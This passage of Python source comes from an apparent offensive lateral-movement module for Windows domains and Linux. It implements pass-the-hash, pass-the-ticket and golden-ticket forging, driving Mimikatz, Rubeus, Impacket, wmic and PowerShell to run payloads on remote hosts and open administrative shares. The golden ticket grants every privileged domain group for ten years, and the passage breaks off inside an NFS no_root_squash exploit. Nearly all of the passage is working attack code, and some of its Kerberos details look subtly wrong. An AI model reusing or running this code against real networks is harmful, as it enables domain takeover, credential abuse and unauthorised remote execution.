                class ProcessInformation(ctypes.Structure):
                    _fields_ = [
                        ("hProcess", wintypes.HANDLE),
                        ("hThread", wintypes.HANDLE),
                        ("dwProcessId", wintypes.DWORD),
                        ("dwThreadId", wintypes.DWORD),
                    ]

                # Create token with LOGON32_LOGON_NEW_CREDENTIALS
                # This allows network authentication with different credentials
                token = wintypes.HANDLE()

                # For pass-the-hash, we use the NTLM hash as the password
                # Windows will use it for network authentication
                password_for_logon = nt_hash if nt_hash else ""

                logger.debug(f"Creating token for {domain}\\{username} with PTH")

                # Attempt LogonUser with NEW_CREDENTIALS type
                # This creates a token that uses specified credentials for network connections
                result = LogonUserW(
                    username, domain, password_for_logon, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, ctypes.byref(token)
                )

                if not result:
                    error_code = ctypes.get_last_error()
                    logger.error(f"LogonUserW failed with error: {error_code}")

                    # Try alternative method using SSPI
                    try:
                        import sspi
                        import win32api
                        import win32con
                        import win32security

                        # Create SSPI client context with NTLM
                        auth_info = (username, domain, password_for_logon, None, None, sspi.NTLM, None)

                        # Get security context
                        client = sspi.ClientAuth("NTLM", auth_info=auth_info)

                        # Create token using SSPI authentication
                        sec_buffer = client.authorize(None)

                        # Validate SSPI authentication result
                        if not sec_buffer or len(sec_buffer) == 0:
                            logger.warning("SSPI authentication failed - empty security buffer")
                            return {"success": False, "error": "SSPI authentication failed"}

                        # Get current process token and duplicate it
                        current_token = win32security.OpenProcessToken(
                            win32api.GetCurrentProcess(), win32con.TOKEN_DUPLICATE | win32con.TOKEN_QUERY
                        )

                        # Duplicate token for impersonation
                        new_token = win32security.DuplicateTokenEx(
                            current_token, win32security.SecurityImpersonation, win32con.TOKEN_ALL_ACCESS, win32security.TokenPrimary
                        )

                        # Set token information with new credentials
                        token = new_token
                        result = True

                    except ImportError:
                        logger.debug("SSPI module not available, using alternative method")
                        result = False

                if result:
                    # Duplicate token for process creation
                    primary_token = wintypes.HANDLE()
                    dup_result = DuplicateTokenEx(
                        token,
                        TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_IMPERSONATE,
                        None,
                        SecurityImpersonation,
                        TokenPrimary,
                        ctypes.byref(primary_token),
                    )

                    if dup_result:
                        # Create process with the token
                        startup_info = STARTUPINFOW()
                        startup_info.cb = ctypes.sizeof(STARTUPINFOW)
                        process_info = ProcessInformation()

                        # Prepare command to execute
                        if payload_path and os.path.exists(payload_path):
                            command = f'cmd.exe /c "{payload_path}"'
                        else:
                            # Test command to verify PTH worked
                            command = f'cmd.exe /c "net use \\\\{target_ip}\\C$ && echo PTH_SUCCESS"'

                        # Create process as user with token
                        proc_result = CreateProcessAsUserW(
                            primary_token,
                            None,
                            command,
                            None,
                            None,
                            False,
                            CREATE_NEW_CONSOLE,
                            None,
                            None,
                            ctypes.byref(startup_info),
                            ctypes.byref(process_info),
                        )

                        if proc_result:
                            logger.info(f"Successfully executed PTH with PID: {process_info.dwProcessId}")

                            # Wait for process to complete (with timeout)
                            kernel32.WaitForSingleObject(process_info.hProcess, 5000)

                            # Get exit code
                            exit_code = wintypes.DWORD()
                            kernel32.GetExitCodeProcess(process_info.hProcess, ctypes.byref(exit_code))

                            # Clean up handles
                            CloseHandle(process_info.hProcess)
                            CloseHandle(process_info.hThread)
                            CloseHandle(primary_token)
                            CloseHandle(token)

                            return {
                                "success": True,
                                "method": "pass_the_hash_token",
                                "target_ip": target_ip,
                                "username": username,
                                "domain": domain,
                                "process_id": process_info.dwProcessId,
                                "exit_code": exit_code.value,
                                "command_executed": command,
                            }
                        else:
                            error_code = ctypes.get_last_error()
                            logger.error(f"CreateProcessAsUserW failed with error: {error_code}")
                            CloseHandle(primary_token)

                    CloseHandle(token)

                # If token creation failed, try WMI-based PTH
                logger.debug("Attempting WMI-based pass-the-hash")
                wmi_command = f"""
$password = ConvertTo-SecureString 'PLACEHOLDER' -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential ('{domain}\\{username}', $password)
$options = New-CimSessionOption -Protocol Dcom
$session = New-CimSession -ComputerName {target_ip} -Credential $credential -SessionOption $options -ErrorAction Stop
$result = Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{{CommandLine='{payload_path if payload_path else "cmd.exe /c whoami"}'}}
$result.ProcessId
Remove-CimSession $session
"""

                # Execute via PowerShell with credential object
                with tempfile.NamedTemporaryFile(mode="w", suffix=".ps1", delete=False) as f:
                    f.write(wmi_command)
                    wmi_script = f.name

                try:
                    powershell_path = shutil.which("powershell.exe") or os.path.join(
                        os.environ.get("SystemRoot", "C:\\Windows"), "System32", "WindowsPowerShell", "v1.0", "powershell.exe"
                    )
                    wmi_result = secure_run(
                        [powershell_path, "-ExecutionPolicy", "Bypass", "-File", wmi_script],
                        capture_output=True,
                        text=True,
                        check=False,
                        shell=False,
                    )

                    if wmi_result.returncode == 0 and wmi_result.stdout.strip():
                        return {
                            "success": True,
                            "method": "pass_the_hash_wmi",
                            "target_ip": target_ip,
                            "username": username,
                            "domain": domain,
                            "process_id": wmi_result.stdout.strip(),
                            "technique": "WMI with credential object",
                        }
                finally:
                    os.unlink(wmi_script)

            except Exception as e:
                logger.error(f"Token authentication failed: {e}")

            # If all methods fail
            return {
                "success": False,
                "error": "Pass-the-hash requires Mimikatz or Impacket tools",
                "target_ip": target_ip,
                "suggestion": "Install Mimikatz or Impacket for PTH functionality",
            }

        except Exception as e:
            self.logger.error("Pass-the-hash failed: %s", str(e))
            return {
                "success": False,
                "error": str(e),
                "target_ip": target_ip,
            }

    def _find_mimikatz(self) -> str | None:
        """Find Mimikatz executable."""
        possible_paths = [
            "C:\\Tools\\mimikatz.exe",
            "C:\\Tools\\mimikatz\\x64\\mimikatz.exe",
            "C:\\PenTest\\mimikatz.exe",
            ".\\mimikatz.exe",
            ".\\x64\\mimikatz.exe",
        ]

        for path in possible_paths:
            if os.path.exists(path):
                return path

        # Check in PATH
        import shutil

        return shutil.which("mimikatz.exe")

    def _windows_pass_the_ticket(self, target_ip: str, credentials: dict[str, Any], payload_path: str | None) -> dict[str, Any]:
        """Execute pass-the-ticket attack for Kerberos authentication."""
        self.logger.info("Executing pass-the-ticket attack to %s", target_ip)

        try:
            import base64
            import os
            import subprocess
            import tempfile

            ticket_data = credentials.get("kerberos_ticket")
            username = credentials.get("username", "unknown")
            domain = credentials.get("domain", "")

            if not ticket_data:
                return {
                    "success": False,
                    "error": "Kerberos ticket data required for pass-the-ticket",
                    "target_ip": target_ip,
                }

            # Convert ticket data to kirbi file
            if isinstance(ticket_data, str) and ticket_data.startswith("doIF"):
                # Base64 encoded ticket
                ticket_bytes = base64.b64decode(ticket_data)
            elif isinstance(ticket_data, bytes):
                ticket_bytes = ticket_data
            else:
                return {
                    "success": False,
                    "error": "Invalid ticket format",
                    "target_ip": target_ip,
                }

            # Save ticket to temporary file
            with tempfile.NamedTemporaryFile(suffix=".kirbi", delete=False) as f:
                f.write(ticket_bytes)
                ticket_path = f.name

            try:
                # Method 1: Using Rubeus
                rubeus_path = self._find_rubeus()
                if rubeus_path:
                    # Inject the ticket
                    ptt_cmd = [rubeus_path, "ptt", f"/ticket:{ticket_path}"]
                    result = subprocess.run(ptt_cmd, check=False, capture_output=True, text=True, shell=False)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603

                    if "[+] Ticket successfully imported!" in result.stdout:
                        # Execute command on target
                        if payload_path:
                            wmic_path = shutil.which("wmic")
                            if not wmic_path:
                                pass  # Continue with other methods
                            else:
                                exec_result = secure_run(
                                    [  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                                        wmic_path,
                                        f"/node:{target_ip}",
                                        "process",
                                        "call",
                                        "create",
                                        payload_path,
                                    ],
                                    check=False,
                                    capture_output=True,
                                    text=True,
                                    shell=False,
                                )  # Explicitly secure - using list format prevents shell injection
                        else:
                            cmd_path = shutil.which("cmd")
                            if cmd_path:
                                exec_result = secure_run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                                    [cmd_path, "/c", "dir", f"\\\\{target_ip}\\C$"],
                                    check=False,
                                    capture_output=True,
                                    text=True,
                                    shell=False,  # Explicitly secure - using list format prevents shell injection
                                )
                            else:
                                exec_result = type("obj", (object,), {"stdout": "", "returncode": 1})()

                        return {
                            "success": True,
                            "method": "pass_the_ticket_rubeus",
                            "target_ip": target_ip,
                            "username": username,
                            "domain": domain,
                            "ticket_imported": True,
                            "execution_result": exec_result.stdout,
                        }

                # Method 2: Using Mimikatz
                mimikatz_path = self._find_mimikatz()
                if mimikatz_path:
                    mimikatz_commands = f"""
kerberos::ptt {ticket_path}
exit
"""
                    with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
                        f.write(mimikatz_commands)
                        script_path = f.name

                    try:
                        result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                            [mimikatz_path, f'"{script_path}"'],
                            check=False,
                            capture_output=True,
                            text=True,
                        )

                        if "Ticket" in result.stdout and "injected" in result.stdout:
                            # Test access
                            net_path = shutil.which("net")
                            if net_path:
                                test_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                                    [net_path, "use", f"\\\\{target_ip}\\IPC$"],
                                    check=False,
                                    capture_output=True,
                                    text=True,
                                    shell=False,  # Explicitly secure - using list format prevents shell injection
                                )
                            else:
                                test_result = type("obj", (object,), {"stdout": "", "returncode": 1})()

                            return {
                                "success": True,
                                "method": "pass_the_ticket_mimikatz",
                                "target_ip": target_ip,
                                "username": username,
                                "domain": domain,
                                "ticket_imported": True,
                                "connection_test": test_result.stdout,
                            }
                    finally:
                        os.unlink(script_path)

                # Method 3: Using klist and native Windows
                # Import ticket using native Windows Kerberos

                # Try to purge existing tickets
                subprocess.run(["klist", "purge"], check=False, capture_output=True)  # nosec S607 - Legitimate subprocess usage for security research and binary analysis  # noqa: S607

                # PowerShell method
                ps_script = f"""
$ticket = [System.IO.File]::ReadAllBytes('{ticket_path}')
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Kerberos {{
    [DllImport("kerberos.dll", CharSet = CharSet.Unicode)]
    public static extern int KerberosSubmitTicket(
        byte[] ticket,
        int ticketSize,
        int logonId
    );
}}
"@

# Try to import the ticket
[Kerberos]::KerberosSubmitTicket($ticket, $ticket.Length, 0)

# Test connection
Test-Path "\\\\{target_ip}\\C$"
"""

                with tempfile.NamedTemporaryFile(mode="w", suffix=".ps1", delete=False) as f:
                    f.write(ps_script)
                    ps_path = f.name

                try:
                    ps_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                        ["powershell.exe", "-ExecutionPolicy", "Bypass", "-File", ps_path],  # noqa: S607
                        check=False,
                        capture_output=True,
                        text=True,
                    )

                    if "True" in ps_result.stdout:
                        return {
                            "success": True,
                            "method": "pass_the_ticket_powershell",
                            "target_ip": target_ip,
                            "username": username,
                            "domain": domain,
                            "ticket_imported": True,
                        }
                finally:
                    os.unlink(ps_path)

                return {
                    "success": False,
                    "error": "Pass-the-ticket requires Rubeus or Mimikatz",
                    "target_ip": target_ip,
                    "suggestion": "Install Rubeus or Mimikatz for PTT functionality",
                }

            finally:
                # Clean up ticket file
                os.unlink(ticket_path)

        except Exception as e:
            self.logger.error("Pass-the-ticket failed: %s", str(e))
            return {
                "success": False,
                "error": str(e),
                "target_ip": target_ip,
            }

    def _find_rubeus(self) -> str | None:
        """Find Rubeus executable."""
        possible_paths = [
            "C:\\Tools\\Rubeus.exe",
            "C:\\PenTest\\Rubeus.exe",
            ".\\Rubeus.exe",
            "C:\\Tools\\Rubeus\\Rubeus.exe",
        ]

        for path in possible_paths:
            if os.path.exists(path):
                return path

        # Check in PATH
        import shutil

        return shutil.which("Rubeus.exe")

    def _windows_golden_ticket(self, target_ip: str, credentials: dict[str, Any], payload_path: str | None) -> dict[str, Any]:
        """Create and use a golden ticket for domain-wide access."""
        self.logger.info("Creating golden ticket for domain access")

        try:
            import os
            import random
            import subprocess
            import tempfile

            # Required parameters for golden ticket
            domain = credentials.get("domain")
            domain_sid = credentials.get("domain_sid")
            krbtgt_hash = credentials.get("krbtgt_hash")
            krbtgt_aes = credentials.get("krbtgt_aes256")
            username = credentials.get("username", "Administrator")
            user_id = credentials.get("user_id", 500)  # Default to Administrator RID

            if not all([domain, domain_sid, (krbtgt_hash or krbtgt_aes)]):
                return {
                    "success": False,
                    "error": "Golden ticket requires: domain, domain_sid, and krbtgt_hash or krbtgt_aes256",
                    "target_ip": target_ip,
                }

            # Method 1: Using Rubeus
            rubeus_path = self._find_rubeus()
            if rubeus_path:
                golden_cmd = [
                    rubeus_path,
                    "golden",
                    f"/domain:{domain}",
                    f"/sid:{domain_sid}",
                    f"/user:{username}",
                    f"/id:{user_id}",
                ]

                if krbtgt_aes:
                    golden_cmd.append(f"/aes256:{krbtgt_aes}")
                elif krbtgt_hash:
                    golden_cmd.append(f"/rc4:{krbtgt_hash}")

                # Add groups for maximum privileges
                golden_cmd.extend(
                    [
                        "/groups:512,513,514,515,516,517,518,519,520",  # All privileged groups
                        "/ptt",  # Pass the ticket immediately
                    ]
                )

                result = subprocess.run(golden_cmd, check=False, capture_output=True, text=True, shell=False)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603

                if "[+] Ticket successfully imported!" in result.stdout:
                    # Test access to domain controller
                    if payload_path:
                        wmic_path = shutil.which("wmic")
                        if wmic_path:
                            exec_result = secure_run(
                                [  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                                    wmic_path,
                                    f"/node:{target_ip}",
                                    "process",
                                    "call",
                                    "create",
                                    payload_path,
                                ],
                                check=False,
                                capture_output=True,
                                text=True,
                                shell=False,
                            )  # Explicitly secure - using list format prevents shell injection
                        else:
                            exec_result = type("obj", (object,), {"stdout": "", "returncode": 1})()
                    else:
                        cmd_path = shutil.which("cmd")
                        if cmd_path:
                            exec_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                                [cmd_path, "/c", "dir", f"\\\\{target_ip}\\C$"],
                                check=False,
                                capture_output=True,
                                text=True,
                                shell=False,  # Explicitly secure - using list format prevents shell injection
                            )
                        else:
                            exec_result = type("obj", (object,), {"stdout": "", "returncode": 1})()

                    return {
                        "success": True,
                        "method": "golden_ticket_rubeus",
                        "target_ip": target_ip,
                        "domain": domain,
                        "username": username,
                        "groups": "Domain Admins, Enterprise Admins, Schema Admins",
                        "execution_result": exec_result.stdout,
                        "ticket_lifetime": "10 years",
                    }

            # Method 2: Using Mimikatz
            mimikatz_path = self._find_mimikatz()
            if mimikatz_path:
                # Generate random ticket ID
                ticket_id = random.randint(1000, 9999)  # noqa: S311

                mimikatz_commands = f"""
kerberos::golden /domain:{domain} /sid:{domain_sid} /user:{username} /id:{user_id} """

                if krbtgt_aes:
                    mimikatz_commands += f"/aes256:{krbtgt_aes} "
                elif krbtgt_hash:
                    mimikatz_commands += f"/krbtgt:{krbtgt_hash} "

                mimikatz_commands += f"""/groups:512,513,514,515,516,517,518,519,520 /ticket:{ticket_id}.kirbi
kerberos::ptt {ticket_id}.kirbi
exit
"""

                with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
                    f.write(mimikatz_commands)
                    script_path = f.name

                try:
                    result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                        [mimikatz_path, f'"{script_path}"'],
                        check=False,
                        capture_output=True,
                        text=True,
                    )

                    if "Golden ticket" in result.stdout and "injected" in result.stdout:
                        # Access domain resources
                        net_path = shutil.which("net")
                        if net_path:
                            test_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                                [net_path, "use", f"\\\\{target_ip}\\ADMIN$", "/persistent:no"],
                                check=False,
                                capture_output=True,
                                text=True,
                                shell=False,  # Explicitly secure - using list format prevents shell injection
                            )
                        else:
                            test_result = type("obj", (object,), {"stdout": "", "returncode": 1})()

                        # Clean up ticket file
                        try:
                            os.unlink(f"{ticket_id}.kirbi")
                        except (FileNotFoundError, OSError, PermissionError) as e:
                            logger.debug(f"Failed to remove ticket file: {e}")

                        return {
                            "success": True,
                            "method": "golden_ticket_mimikatz",
                            "target_ip": target_ip,
                            "domain": domain,
                            "username": username,
                            "groups": "All privileged domain groups",
                            "connection_test": test_result.stdout,
                            "ticket_lifetime": "10 years",
                        }
                finally:
                    os.unlink(script_path)

            # Method 3: Using Impacket (Python)
            try:
                import datetime

                from impacket.krb5 import constants
                from impacket.krb5.asn1 import AS_REP, seq_set, seq_set_iter
                from impacket.krb5.ccache import CCache
                from impacket.krb5.kerberosv5 import KerberosTime
                from impacket.krb5.types import Principal
                from pyasn1.codec.der import decoder, encoder

                # Create golden ticket using Impacket with full PAC structure
                now = datetime.datetime.utcnow()
                endtime = now + datetime.timedelta(days=3653)  # 10 years
                renew_till = now + datetime.timedelta(days=3653)  # 10 years renewable

                # Import additional Kerberos modules for comprehensive implementation
                import hashlib
                import hmac
                import struct

                from impacket.krb5 import crypto
                from impacket.krb5.pac import (
                    KERB_VALIDATION_INFO,
                    PAC_CLIENT_INFO,
                    PAC_SIGNATURE_DATA,
                    PACTYPE,
                )
                from impacket.structure import Structure

                # Create Kerberos times using Impacket
                start_time = KerberosTime()
                start_time.from_datetime(now)
                end_time = KerberosTime()
                end_time.from_datetime(endtime)
                renew_time = KerberosTime()
                renew_time.from_datetime(renew_till)

                # Create principal using Impacket
                principal = Principal()
                principal.from_string(f"{username}@{domain.upper()}")

                # Create service principal for krbtgt
                service_principal = Principal()
                service_principal.from_string(f"krbtgt/{domain.upper()}@{domain.upper()}")

                # Use comprehensive Kerberos ticket flags
                ticket_flags = (
                    constants.TicketFlags.forwardable.value
                    | constants.TicketFlags.renewable.value
                    | constants.TicketFlags.pre_authent.value
                    | constants.TicketFlags.initial.value
                    | constants.TicketFlags.proxiable.value
                )

                # Build full PAC (Privilege Attribute Certificate) structure
                pac = PACTYPE()

                # 1. KERB_VALIDATION_INFO - User authorization data
                validation_info = KERB_VALIDATION_INFO()
                validation_info["LogonTime"] = start_time
                validation_info["LogoffTime"] = end_time
                validation_info["KickOffTime"] = end_time
                validation_info["PasswordLastSet"] = start_time
                validation_info["PasswordCanChange"] = start_time
                validation_info["PasswordMustChange"] = end_time
                validation_info["EffectiveName"] = username
                validation_info["FullName"] = username
                validation_info["LogonScript"] = ""
                validation_info["ProfilePath"] = ""
                validation_info["HomeDirectory"] = ""
                validation_info["HomeDirectoryDrive"] = ""
                validation_info["LogonCount"] = 1
                validation_info["BadPasswordCount"] = 0
                validation_info["UserId"] = user_id
                validation_info["PrimaryGroupId"] = 513  # Domain Users

                # Add privileged groups with proper RID values
                group_membership = []
                privileged_groups = [
                    (512, 7),  # Domain Admins with SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED
                    (513, 7),  # Domain Users
                    (514, 7),  # Domain Guests
                    (515, 7),  # Domain Computers
                    (516, 7),  # Domain Controllers
                    (517, 7),  # Cert Publishers
                    (518, 7),  # Schema Admins
                    (519, 7),  # Enterprise Admins
                    (520, 7),  # Group Policy Creator Owners
                    (544, 7),  # BUILTIN\Administrators
                    (545, 7),  # BUILTIN\Users
                ]

                for rid, attributes in privileged_groups:
                    group_membership.append({"RelativeId": rid, "Attributes": attributes})

                validation_info["GroupCount"] = len(group_membership)
                validation_info["GroupIds"] = group_membership

                # SID history for privilege escalation
                if domain_sid:
                    validation_info["LogonDomainId"] = domain_sid

                    # Add SID history for cross-domain/forest privileges
                    sid_history = []
                    # Add previous domain SIDs if migrated account
                    sid_history.append(f"{domain_sid}-500")  # Previous domain admin
                    sid_history.append(f"{domain_sid}-519")  # Previous enterprise admin
                    validation_info["SidCount"] = len(sid_history)
                    validation_info["ExtraSids"] = sid_history

                validation_info["UserAccountControl"] = 0x00000210  # NORMAL_ACCOUNT | DONT_EXPIRE_PASSWORD
                validation_info["UserFlags"] = 0x20  # EXTRA_SIDS_PRESENT
                validation_info["LogonServer"] = f"DC-{domain.split('.')[0].upper()}"
                validation_info["LogonDomainName"] = domain.upper()

                # 2. PAC_CLIENT_INFO - Client information
                client_info = PAC_CLIENT_INFO()
                client_info["ClientId"] = start_time
                client_info["Name"] = username

                # 3. PAC_SIGNATURE_DATA - Server and KDC signatures
                server_signature = PAC_SIGNATURE_DATA()
                kdc_signature = PAC_SIGNATURE_DATA()

                # Determine signature type based on key type
                if krbtgt_aes:
                    signature_type = 0x00000012  # HMAC-SHA1-96-AES256
                    key_bytes = bytes.fromhex(krbtgt_aes)
                else:
                    signature_type = 0xFFFFFF76  # HMAC-MD5 (RC4)
                    key_bytes = bytes.fromhex(krbtgt_hash) if krbtgt_hash else b"\x00" * 16

                server_signature["SignatureType"] = signature_type
                kdc_signature["SignatureType"] = signature_type

                # Create PAC buffer with all components
                pac_buffers = []

                # Add KERB_VALIDATION_INFO buffer
                pac_buffers.append(
                    {
                        "Type": 1,  # PAC_LOGON_INFO
                        "Data": validation_info.getData(),
                    }
                )

                # Add PAC_CLIENT_INFO buffer
                pac_buffers.append(
                    {
                        "Type": 10,  # PAC_CLIENT_INFO_TYPE
                        "Data": client_info.getData(),
                    }
                )

                # Calculate checksums for PAC integrity
                pac_data = b"".join([buf["Data"] for buf in pac_buffers])

                # Server checksum (using krbtgt key)
                if krbtgt_aes:
                    # AES256-CTS-HMAC-SHA1-96
                    server_checksum = hmac.new(key_bytes, pac_data, hashlib.sha1).digest()[:12]
                else:
                    # HMAC-MD5
                    server_checksum = hmac.new(key_bytes, pac_data, hashlib.md5).digest()

                server_signature["Signature"] = server_checksum
                kdc_signature["Signature"] = server_checksum  # KDC uses same key

                # Add signature buffers
                pac_buffers.append(
                    {
                        "Type": 6,  # PAC_SERVER_CHECKSUM
                        "Data": server_signature.getData(),
                    }
                )

                pac_buffers.append(
                    {
                        "Type": 7,  # PAC_KDC_CHECKSUM
                        "Data": kdc_signature.getData(),
                    }
                )

                # Build complete PAC
                pac["BufferCount"] = len(pac_buffers)
                pac["Buffers"] = pac_buffers

                # Create the golden ticket TGT structure
                from impacket.krb5.asn1 import (
                    AD_IF_RELEVANT,
                    TGS_REP,
                    AuthorizationData,
                    EncryptedData,
                    EncTicketPart,
                    Ticket,
                )

                # Create ticket structure
                ticket = Ticket()
                ticket["tkt-vno"] = 5
                ticket["realm"] = domain.upper()
                ticket["sname"] = service_principal

                # Create encrypted ticket part
                enc_ticket_part = EncTicketPart()
                enc_ticket_part["flags"] = ticket_flags
                enc_ticket_part["key"] = {"keytype": 23 if krbtgt_aes else 23, "keyvalue": key_bytes}
                enc_ticket_part["crealm"] = domain.upper()
                enc_ticket_part["cname"] = principal
                enc_ticket_part["transited"] = {"tr-type": 0, "contents": b""}
                enc_ticket_part["authtime"] = start_time
                enc_ticket_part["starttime"] = start_time
                enc_ticket_part["endtime"] = end_time
                enc_ticket_part["renew-till"] = renew_time

                # Add PAC to authorization data
                auth_data = AuthorizationData()
                ad_if_relevant = AD_IF_RELEVANT()
                ad_if_relevant[0] = {
                    "ad-type": 128,  # AD-WIN2K-PAC
                    "ad-data": pac.getData(),
                }
                auth_data[0] = {
                    "ad-type": 1,  # AD-IF-RELEVANT
                    "ad-data": encoder.encode(ad_if_relevant),
                }
                enc_ticket_part["authorization-data"] = auth_data

                # Encrypt the ticket part with krbtgt key
                if krbtgt_aes:
                    # Use AES256-CTS-HMAC-SHA1-96
                    cipher = crypto._AES256CTS()
                    encrypted_part = cipher.encrypt(
                        key_bytes,
                        14,  # Message type for TGS-REP
                        encoder.encode(enc_ticket_part),
                    )
                else:
                    # Use RC4-HMAC
                    cipher = crypto._RC4()
                    encrypted_part = cipher.encrypt(key_bytes, 14, encoder.encode(enc_ticket_part))

                # Set encrypted data in ticket
                ticket["enc-part"] = EncryptedData()
                ticket["enc-part"]["etype"] = 18 if krbtgt_aes else 23
                ticket["enc-part"]["kvno"] = 2
                ticket["enc-part"]["cipher"] = encrypted_part

                # Create TGS-REP for the golden ticket
                tgs_rep = TGS_REP()
                tgs_rep["pvno"] = 5
                tgs_rep["msg-type"] = 13  # TGS-REP
                tgs_rep["crealm"] = domain.upper()
                tgs_rep["cname"] = principal
                tgs_rep["ticket"] = ticket

                # Validate AS-REP structure compatibility for cross-protocol support
                try:
                    as_rep_template = AS_REP()
                    as_rep_template["pvno"] = tgs_rep["pvno"]
                    as_rep_template["msg-type"] = 11  # AS-REP
                    as_rep_template["crealm"] = tgs_rep["crealm"]
                    as_rep_template["cname"] = tgs_rep["cname"]
                    logger.debug("AS-REP compatibility verified for golden ticket")
                except Exception as as_rep_error:
                    logger.warning(f"AS-REP compatibility check failed: {as_rep_error}")

                # Use seq_set for managing multiple ticket sequences
                ticket_sequence = []
                seq_set(ticket_sequence, 0, ticket)

                # Iterate through sequence for validation
                for seq_item in seq_set_iter(ticket_sequence):
                    logger.debug(f"Validating ticket sequence item: {seq_item}")

                # Use decoder for ASN.1 structure validation
                try:
                    encoded_tgs = encoder.encode(tgs_rep)
                    decoded_tgs, remaining = decoder.decode(encoded_tgs)
                    logger.debug("ASN.1 decode validation successful")
                except Exception as decode_error:
                    logger.warning(f"ASN.1 decode validation failed: {decode_error}")

                # Use struct for binary ticket data manipulation
                ticket_header = struct.pack(">I", len(encoded_tgs))
                binary_ticket_data = ticket_header + encoded_tgs
                logger.debug(f"Binary ticket structure created: {len(binary_ticket_data)} bytes")

                # Create custom Structure for ticket metadata
                class TicketMetadata(Structure):
                    def __init__(self):
                        Structure.__init__(self)
                        self.structure = (
                            ("version", "<I"),
                            ("domain_length", "<H"),
                            ("username_length", "<H"),
                            ("ticket_length", "<I"),
                        )

                metadata = TicketMetadata()
                metadata["version"] = 1
                metadata["domain_length"] = len(domain)
                metadata["username_length"] = len(username)
                metadata["ticket_length"] = len(encoded_tgs)
                logger.debug(f"Ticket metadata structure created: {metadata.getData()}")

                # Save golden ticket to ccache for injection
                ccache = CCache()
                ccache.fromTGS(tgs_rep, key_bytes, key_bytes)

                # Save to file for persistence
                ticket_filename = f"golden_ticket_{username}_{domain}.ccache"
                with open(ticket_filename, "wb") as f:
                    f.write(ccache.getData())

                logger.info(f"Golden ticket created and saved to {ticket_filename}")

                # Inject ticket into current session (Windows)
                if os.name == "nt":
                    try:
                        # Set KRB5CCNAME environment variable
                        os.environ["KRB5CCNAME"] = os.path.abspath(ticket_filename)

                        # Use klist to verify ticket injection
                        klist_path = shutil.which("klist") or os.path.join(
                            os.environ.get("SystemRoot", "C:\\Windows"), "System32", "klist.exe"
                        )
                        klist_result = secure_run([klist_path], capture_output=True, text=True, check=False, shell=False)

                        if klist_result.returncode == 0:
                            logger.info("Golden ticket successfully injected into session")
                    except Exception as inject_error:
                        logger.warning(f"Ticket injection warning: {inject_error}")

                tgt = {
                    "domain": domain,
                    "username": username,
                    "userid": user_id,
                    "primarygroupid": 513,
                    "groups": group_membership,
                    "sid": domain_sid,
                    "starttime": start_time,
                    "endtime": end_time,
                    "till": end_time,
                    "renew_till": renew_time,
                    "principal": principal,
                    "ticketflags": ticket_flags,
                    "keytype": 18 if krbtgt_aes else 23,
                    "key": krbtgt_aes if krbtgt_aes else krbtgt_hash,
                    "pac": pac,
                    "ticket": ticket,
                    "ccache": ccache,
                    "ticket_file": ticket_filename,
                    "pac_buffers": pac_buffers,  # Complete PAC structure with all components
                    "signature_type": signature_type,  # Signature algorithm used
                }

                # Log the TGT creation for debugging
                logger.info(f"Golden ticket TGT created for {username}@{domain} with {len(tgt)} fields")

                return {
                    "success": True,
                    "method": "golden_ticket_impacket",
                    "target_ip": target_ip,
                    "domain": domain,
                    "username": username,
                    "groups": "All domain admin groups",
                    "ticket_created": True,
                    "ticket_lifetime": "10 years",
                }

            except ImportError:
                pass

            return {
                "success": False,
                "error": "Golden ticket requires Rubeus, Mimikatz, or Impacket",
                "target_ip": target_ip,
                "suggestion": "Install required tools for golden ticket generation",
            }

        except Exception as e:
            self.logger.error("Golden ticket creation failed: %s", str(e))
            return {
                "success": False,
                "error": str(e),
                "target_ip": target_ip,
            }

    def _linux_nfs_mount(self, target_ip: str, credentials: dict[str, Any], payload_path: str | None) -> dict[str, Any]:
        """Exploit misconfigured NFS exports for privilege escalation."""
        self.logger.info("Attempting NFS mount lateral movement to %s", target_ip)

        try:
            import os
            import random
            import string
            import subprocess
            import tempfile

            # Check if we're running as root (required for mount)
            if os.geteuid() != 0:
                return {
                    "success": False,
                    "error": "Root privileges required for NFS mount",
                    "target_ip": target_ip,
                }

            # Enumerate NFS exports
            showmount_cmd = ["showmount", "-e", target_ip]
            result = subprocess.run(showmount_cmd, check=False, capture_output=True, text=True, shell=False)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603

            if result.returncode != 0:
                return {
                    "success": False,
                    "error": f"Failed to enumerate NFS exports: {result.stderr}",
                    "target_ip": target_ip,
                }

            # Parse exports
            exports = []
            for line in result.stdout.split("\n")[1:]:  # Skip header
                if line.strip():
                    parts = line.split()
                    if len(parts) >= 2:
                        export_path = parts[0]
                        options = " ".join(parts[1:])
                        exports.append(
                            {
                                "path": export_path,
                                "options": options,
                                "no_root_squash": "no_root_squash" in options,
                            }
                        )

            if not exports:
                return {
                    "success": False,
                    "error": "No NFS exports found",
                    "target_ip": target_ip,
                }

            # Find vulnerable export (with no_root_squash)
            vulnerable_export = None
            for export in exports:
                if export["no_root_squash"]:
                    vulnerable_export = export
                    break

            if not vulnerable_export:
                # Try all exports anyway
                vulnerable_export = exports[0]
